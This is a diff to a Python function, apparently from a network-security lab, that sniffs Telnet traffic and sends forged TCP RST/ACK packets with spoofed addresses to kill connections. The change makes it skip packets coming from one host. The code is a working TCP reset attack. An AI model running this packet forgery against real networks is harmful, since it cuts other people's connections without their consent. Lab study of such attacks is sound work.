@@ -545,16 +545,17 @@ def perform_tcp_rst_on_telnet():
 
     # Function to send TCP RST/ACK packets
     def do_rst(pkt):
-        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-        tcp = TCP(
-            sport=pkt[TCP].dport,
-            dport=pkt[TCP].sport,
-            flags=0x14,
-            seq=pkt[TCP].ack,
-            ack=pkt[TCP].seq + 1,
-        )  # 0x14 = 20 --> RST/ACK
-        pkt = ip / tcp
-        send(pkt, verbose=0)  # Send the forged packet
+        if pkt[IP].src != host2:
+            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+            tcp = TCP(
+                sport=pkt[TCP].dport,
+                dport=pkt[TCP].sport,
+                flags=0x14,
+                seq=pkt[TCP].ack,
+                ack=pkt[TCP].seq + 1,
+            )  # 0x14 = 20 --> RST/ACK
+            pkt = ip / tcp
+            send(pkt, verbose=0)  # Send the forged packet
 
     # Sniff for Telnet packets and perform TCP RST/ACK attack
     sniff(
